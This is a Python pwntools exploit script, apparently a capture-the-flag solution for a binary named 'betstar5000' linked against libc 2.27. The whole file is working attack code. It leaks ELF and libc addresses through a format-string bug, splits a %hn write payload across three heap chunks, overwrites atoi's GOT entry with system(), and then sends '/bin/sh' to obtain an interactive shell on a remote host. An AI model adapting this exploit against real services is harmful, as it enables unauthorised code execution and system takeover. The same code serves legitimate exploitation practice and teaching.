#!/usr/bin/env python3

from pwn import *

exe = ELF("./betstar5000")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    PLAY = "1"
    VIEW = "2"
    ADD = "3"
    EDIT = "4"
    QUIT = "5"

    # leak elf, libc addresses

    r.sendline("1")
    r.sendline("%x%x")

    r.sendline(PLAY)
    r.sendline("1") # nr of players
    r.sendline("1") # bet
    
    r.recvuntil("winner is *drumroll*: ")
    leak = r.recvn(16)
    elf_leak = int(leak[:8], 16)
    libc_leak = int(leak[-8:], 16)

    log.info("elf address leak: {}".format(hex(elf_leak)))
    log.info("libc address leak: {}".format(hex(libc_leak)))
    libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
    exe.address = elf_leak - 4188

    system = libc.symbols['system']
    atoi_got = exe.got['atoi']
    log.info("system address: {}".format(hex(system)))
    log.info("atoi@got address: {}".format(hex(atoi_got)))
    
    # dummy chunks

    r.sendline(ADD)
    r.sendline("A" * 19)
    r.sendline(ADD)
    r.sendline("B" * 19)
    r.sendline(ADD)
    r.sendline("C" * 19)

    # payload string

    payload = ""
    payload += p32(atoi_got) + p32(atoi_got+2) 
    payload += "%{}x".format((system & 0x0000ffff) - 8) + "%19$hn" 
    payload += "%{}x".format(((system & 0xffff0000) >> 16) - (system & 0x0000ffff)) + "%20$hn"
    log.info("length of payload string: {}".format(len(payload)))

    # edit the dummy chunks to create on big string

    r.sendline(EDIT)
    r.sendline("1")
    r.sendline(payload[:16])

    r.sendline(EDIT)
    r.sendline("2")
    r.sendline(payload[16:32])

    r.sendline(EDIT)
    r.sendline("3")
    r.sendline(payload[32:])

    # overwrite atoi@got with system

    r.sendline(PLAY)
    r.sendline("2")
    r.sendline("999")
    r.sendline("1")

    # trigger format string bug

    r.sendline(ADD)
    r.sendline("/bin/sh")

    r.interactive()


if __name__ == "__main__":
    main()